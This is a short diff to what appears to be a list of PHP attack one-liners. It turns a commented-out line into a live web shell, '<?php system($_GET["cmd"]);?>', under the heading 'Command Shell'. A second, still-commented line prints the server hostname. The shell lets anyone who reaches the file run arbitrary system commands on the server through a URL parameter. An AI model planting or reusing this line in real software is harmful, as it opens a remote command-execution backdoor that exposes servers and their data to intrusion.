@@ -1,5 +1,5 @@
 # Command Shell
-#<?php system($_REQUEST["cmd"]);?>
+<?php system($_GET["cmd"]);?>
 #
 # Get Hostname
 #<?php echo gethostname();?>
